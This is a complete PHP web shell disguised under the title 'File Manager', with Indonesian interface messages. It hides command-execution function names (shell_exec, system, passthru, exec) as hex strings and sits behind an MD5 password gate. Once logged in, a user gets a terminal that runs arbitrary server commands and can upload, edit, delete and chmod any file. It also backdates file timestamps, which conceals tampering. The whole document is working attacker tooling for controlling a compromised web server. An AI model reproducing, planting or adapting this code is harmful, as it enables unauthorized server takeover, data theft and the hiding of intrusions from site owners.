<?php
error_reporting(0);
session_start();
$g = [ "6d6435", "686561646572", "696e695f736574", "626173656e616d65", "676574637764", "6469736b5f667265655f7370616365", "6469736b5f746f74616c5f7370616365", "70687076657273696f6e", "696e695f676574", "7368656c6c5f65786563", "65786563", "73797374656d", "7061737374687275", "7374725f7265706c616365", "66696c655f657869737473", "69735f646972", "6d6b646972", "726d646972", "756e6c696e6b", "636f7079", "72656e616d65", "63686d6f64", "6f6374646563", "7363616e646972", "66696c6573697a65", "66696c656d74696d65", "737472746f74696d65", "64617465", "746f756368", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "66696c657065726d73" ]; foreach ($g as $k => $v) { $g[$k] = hex2bin($v); } $a = $g[0]; $b = $g[1]; $c = $g[2]; $d = $g[3]; $e = $g[4]; $f = $g[5]; $g2 = $g[6]; $h = $g[7]; $i = $g[8]; $j = $g[9]; $k = $g[10]; $l = $g[11]; $m = $g[12]; $n = $g[13]; $o = $g[14]; $p = $g[15]; $q = $g[16]; $r = $g[17]; $s = $g[18]; $t = $g[19]; $u = $g[20]; $v = $g[21]; $w = $g[22]; $x = $g[23]; $y = $g[24]; $z = $g[25]; $aa = $g[26]; $ab = $g[27]; $ac = $g[28]; $ad = $g[29]; $ae = $g[30]; $af = $g[31];
session_start();
$c("display_errors", 0);
$c("memory_limit", "256M");
$b("Content-Type: text/html; charset=UTF-8");
$APP_NAME = "File Manager";
$BASE_PATH = $e();
$PASSWORD_MD5 = "a84e5f25e7f6d5de9b82ce3f64d1b8fa";
if(isset($_POST['login'])){
    $pass = $_POST['password'];
    if($a($pass) === $PASSWORD_MD5){
        $_SESSION['logged_in'] = true;
        $b("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        $msg = "Password salah!";
    }
}
if(isset($_GET['logout'])){
    session_destroy();
    $b("Location: ".$_SERVER['PHP_SELF']);
    exit;
}
if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true){
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title><?=$APP_NAME?> - Login</title>
        <style>
            body{background:#0d0d0d;color:#eee;font-family:monospace;text-align:center;padding-top:100px;}
            input{padding:6px;margin:5px;border-radius:4px;border:none;}
            input[type=password]{width:200px;}
            input[type=submit]{background:#7d3c98;color:#fff;cursor:pointer;}
            .msg{color:#e74c3c;margin-top:10px;}
        </style>
    </head>
    <body>
        <h1><?=$APP_NAME?></h1>
        <form method="POST">
            Password: <input type="password" name="password"><br>
            <input type="submit" name="login" value="Login">
        </form>
        <?php if(isset($msg)) echo "<div class='msg'>$msg</div>"; ?>
    </body>
    </html>
    <?php
    exit;
}
// FUNGSI PERMS
function perms($file){ 
    global $af;
    $perm = $af($file);
    $octal = substr(sprintf('%o', $perm), -4);
    return $octal;
}
function owner($file){ 
    global $j; 
    if(function_exists('posix_getpwuid')){ 
        $uid = fileowner($file); 
        $info = posix_getpwuid($uid); 
        return $info['name']; 
    } elseif(function_exists($j)){ 
        $owner = $j('ls -ld '.escapeshellarg($file).' | awk \'{print $3}\''); 
        return trim($owner); 
    } 
    return 'unknown'; 
}
function last_modified($file){ 
    global $z,$ab; 
    return $ab("Y-m-d H:i:s", $z($file)); 
}
function change_date($target, $new_date){ 
    global $aa,$ac; 
    $ts = $aa($new_date); 
    return ($ts && $ts > 0) ? $ac($target, $ts) : false; 
}
function exe($md){ 
    global $j,$k,$l,$m; 
    if(function_exists($j)) return $j($md); 
    elseif(function_exists($k)){ $k($md,$o); return implode("\n",$o); } 
    elseif(function_exists($l)){ ob_start(); $l($md); return ob_get_clean(); } 
    elseif(function_exists($m)){ ob_start(); $m($md); return ob_get_clean(); } 
    return "N/A"; 
}
$path = isset($_GET['path']) ? $_GET['path'] : $BASE_PATH;
$path = $n("\\","/",$path);
$paths = explode("/",$path);
$search = isset($_GET['search']) ? strtolower($_GET['search']) : "";
$msg = "";
// File operations
if(isset($_FILES['file'])){
    $dest = $path.'/'.$_FILES['file']['name'];
    $msg = $t($_FILES['file']['tmp_name'],$dest) ? "Upload Berhasil" : "Upload Gagal";
}
if(isset($_POST['newfile'])){ $ad($path.'/'.$_POST['newfile'],""); $msg="File dibuat"; }
if(isset($_POST['newfolder'])){ $q($path.'/'.$_POST['newfolder']); $msg="Folder dibuat"; }
if(isset($_POST['delete'])){ $t=$_POST['target']; $p($t)?@$r($t):@$s($t); $msg="Dihapus"; }
if(isset($_POST['rename'])){ $u($_POST['oldname'],$path.'/'.$_POST['newname']); $msg="Rename berhasil"; }
if(isset($_POST['chmod'])){ $v($_POST['target'],$w($_POST['perm'])); $msg="Chmod berhasil"; }
if(isset($_POST['savefile'])){ $ad($_POST['target'],$_POST['src']); $msg="File disimpan"; }
if(isset($_POST['chdate'])){ if(change_date($_POST['target'], $_POST['new_date'])){ $msg="Tanggal berhasil diubah"; } else { $msg="Format: YYYY-MM-DD HH:MM:SS"; } }
$terminal_output = "";
$terminal_show = isset($_POST['toggle_terminal']) ? true : false;
if(isset($_POST['execmd'])){ $terminal_output = exe($_POST['cmd']); $terminal_show = true; }
?>
<!DOCTYPE html>
<html>
<head>
<title><?=$APP_NAME?></title>
<style>
body{font-family:monospace;background:#0d0d0d;color:#eee;margin:0;}
h1{color:#7d3c98;text-align:center;padding:15px 0;margin:0;font-size:28px;cursor:pointer;}
h1:hover{opacity:0.8;}
a{color:#1abc9c;text-decoration:none;}a:hover{color:#f1c40f;}
table{width:95%;margin:auto;border-collapse:collapse;font-size:14px;}
th,td{border:1px solid #444;padding:8px;text-align:left;position:relative;}
th{background:#7d3c98;color:#fff;}
tr:nth-child(even){background:#111;}
tr:hover{background:#222;}
input,textarea,select,button{background:#222;color:#1abc9c;border:1px solid #555;border-radius:4px;padding:4px;}
textarea{width:95%;height:250px;}
button.action-btn{background:#7d3c98;color:#fff;border:none;padding:3px 6px;cursor:pointer;border-radius:3px;}
td{position:relative;}
.floating-menu{position:absolute;top:100%;left:0;background:#222;border:1px solid #555;padding:5px;border-radius:4px;min-width:160px;display:none;z-index:100;}
.floating-menu form{margin:0;padding:5px 0;}
.floating-menu form input{width:100%;margin:2px 0;}
.perm-code{color:#3498db;}
.owner-code{color:#e67e22;}
.date-code{color:#2ecc71;}
#terminalBox{position:fixed;top:10px;right:10px;width:420px;background:#111;border:1px solid #7d3c98;padding:10px;z-index:1000;display:<?=$terminal_show?'block':'none'?>;border-radius:6px;}
#terminalBox h3{margin:0 0 5px 0;color:#f1c40f;}
#terminalBox button{float:right;background:red;color:#fff;border:none;padding:2px 6px;cursor:pointer;}
.breadcrumb a{margin-right:5px;color:#1abc9c;}
.msg-box{margin-top:5px;padding:5px;background:#111;border:1px solid #24ff03;border-radius:4px;color:#24ff03;}
#toggleTerminalBtn{background:#f39c12;color:#111;border:none;padding:3px 6px;border-radius:3px;cursor:pointer;}
.logout-btn{background:#e67e22;color:#fff;border:none;padding:3px 8px;border-radius:3px;cursor:pointer;margin-left:5px;text-decoration:none;display:inline-block;font-size:12px;}
.logout-btn:hover{background:#d35400;}
.modal{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#111;border:1px solid #7d3c98;border-radius:6px;padding:10px;z-index:2000;width:80%;max-width:600px;}
.modal textarea{width:100%;height:300px;}
.modal h3{color:#f1c40f;margin:0 0 5px 0;}
.modal .close{color:red;cursor:pointer;float:right;font-size:16px;}
.file-link{cursor:pointer;color:#1abc9c;}
.file-link:hover{color:#f1c40f;}
</style>
<script>
function toggleActionMenu(id){
    let menu = document.getElementById(id);
    if(menu.style.display=='block'){ menu.style.display='none'; }
    else { document.querySelectorAll('.floating-menu').forEach(m=>m.style.display='none'); menu.style.display='block'; }
}
function openEditModal(id){ 
    document.getElementById(id).style.display='block'; 
}
function closeEditModal(id){ 
    document.getElementById(id).style.display='none'; 
}
function toggleTerminal(){ 
    var t=document.getElementById('terminalBox'); 
    t.style.display=(t.style.display=='block')?'none':'block'; 
}
function goHome(){ 
    window.location.href = window.location.pathname;
}
document.addEventListener('click', function(e){
    if(!e.target.closest('.floating-menu') && !e.target.classList.contains('action-btn')){
        document.querySelectorAll('.floating-menu').forEach(m=>m.style.display='none');
    }
});
</script>
</head>
<body>
<h1 onclick="goHome()"><?=$APP_NAME?></h1>
<div id="terminalBox">
  <button onclick="toggleTerminal()">[X]</button>
  <h3>Terminal</h3>
  <form method="POST">
    <input type="text" size="30" name="cmd">
    <input type="submit" name="execmd" value="Run">
    <input type="hidden" name="toggle_terminal" value="1">
  </form>
  <?php if($terminal_output) echo "<textarea readonly>$terminal_output</textarea>"; ?>
</div>
<div style="margin:10px;padding:10px;background:#111;border:1px solid #7d3c98;border-radius:6px;">
<b>Server Info</b><br>
PHP: <?=$h();?><br>
Disable: <?=$i('disable_functions')?><br>
Path: <?=$path?><br>
Disk: <?=round($f($path)/1024/1024,2)?> MB / <?=round($g2($path)/1024/1024,2)?> MB
<div style="margin-top:10px; display:flex; gap:8px; align-items:center;">
    <button type="button" id="toggleTerminalBtn" onclick="toggleTerminal()">Toggle Terminal</button>
    <a href="?logout=1" class="logout-btn" onclick="event.stopPropagation();">Logout</a>
</div>
</div>
<div class="breadcrumb" style="margin:10px;">
<?php
foreach($paths as $id=>$pat){
    if($pat==''&&$id==0){echo '<a href="?path=/">/</a>';continue;}
    if($pat=='')continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){echo $paths[$i]; if($i!=$id)echo "/";}
    echo '">'.$pat.'</a>/';
}
?>
</div>
<div style="margin:10px;padding:5px;background:#111;border:1px solid #7d3c98;border-radius:6px;">
<form enctype="multipart/form-data" method="POST">Upload: <input type="file" name="file"><input type="submit" value="Go"></form>
<form method="POST">New File: <input type="text" name="newfile"><input type="submit" value="Create"></form>
<form method="POST">New Folder: <input type="text" name="newfolder"><input type="submit" value="Create"></form>
<?php if($msg) echo "<div class='msg-box'>$msg</div>";?>
</div>
<div style="margin:10px;">
<form method="GET">
<input type="hidden" name="path" value="<?=$path?>">
Search: <input type="text" name="search" value="<?=htmlspecialchars($search)?>">
<input type="submit" value="Find">
</form>
</div>
<div id="content">
<table>
<tr><th>Name</th><th>Size</th><th>Perm</th><th>Owner</th><th>Last Modified</th><th>Action</th></tr>
<?php
$scandir = $x($path);
$folders = [];
$files = [];
foreach($scandir as $f){
    if($f=="."||$f=="..") continue;
    if($search && stripos($f,$search)===false) continue;
    if($p($path.'/'.$f)) $folders[]=$f;
    else $files[]=$f;
}
function renderRow($full,$f,$isFolder=false){
    global $y,$ad,$ae,$d,$p,$r,$s,$u,$w,$z,$ab,$o,$a,$af;
    $size = $isFolder ? '--' : ($y($full)>=1048576 ? round($y($full)/1048576,2)." MB" : round($y($full)/1024,2)." KB");
    $id = 'menu_'.$a($full);
    $editModal = 'editModal_'.$a($full);
    $current_date = last_modified($full);
    $perm_value = perms($full);
    echo "<tr>";
    if($isFolder){
        echo "<td><a href='?path=$full'>📁 $f</a></td>";
    } else {
        echo "<td><span class='file-link' onclick=\"openEditModal('$editModal')\">📄 $f</span></td>";
    }
    echo "<td>$size</td>";
    echo "<td class='perm-code'>$perm_value</td>";
    echo "<td class='owner-code'>".owner($full)."</td>";
    echo "<td class='date-code'>$current_date</td>";
    echo "<td>";
    echo "<button class='action-btn' onclick=\"toggleActionMenu('$id')\">Action</button>";
    echo "<div class='floating-menu' id='$id'>";
    echo "<form method='POST'><input type='hidden' name='target' value='$full'><input type='submit' name='delete' value='Delete'></form>";
    echo "<form method='POST'><input type='hidden' name='oldname' value='$full'>Rename: <input type='text' name='newname'><input type='submit' name='rename' value='Go'></form>";
    echo "<form method='POST'><input type='hidden' name='target' value='$full'>Chmod: <input type='text' name='perm' value='$perm_value'><input type='submit' name='chmod' value='Go'></form>";
    echo "<form method='POST'><input type='hidden' name='target' value='$full'>CHDATE: <input type='text' name='new_date' placeholder='YYYY-MM-DD HH:MM:SS' value='$current_date'><input type='submit' name='chdate' value='Apply'></form>";
    if(!$isFolder) echo "<button type='button' onclick=\"openEditModal('$editModal')\">Edit</button>";
    echo "</div></td></tr>";
    if(!$isFolder){
        $content = ($o($full) && !$p($full)) ? htmlspecialchars($ae($full)) : "";
        echo "<div class='modal' id='$editModal'>";
        echo "<span class='close' onclick=\"closeEditModal('$editModal')\">&times;</span>";
        echo "<h3>Edit File: $f</h3>";
        echo "<form method='POST'>";
        echo "<textarea name='src'>$content</textarea><br>";
        echo "<input type='hidden' name='target' value='$full'>";
        echo "<input type='submit' name='savefile' value='Save'>";
        echo "</form></div>";
    }
}
foreach($folders as $f) renderRow($path.'/'.$f,$f,true);
foreach($files as $f) renderRow($path.'/'.$f,$f,false);
?>
</table>
</div>
</body>
</html>
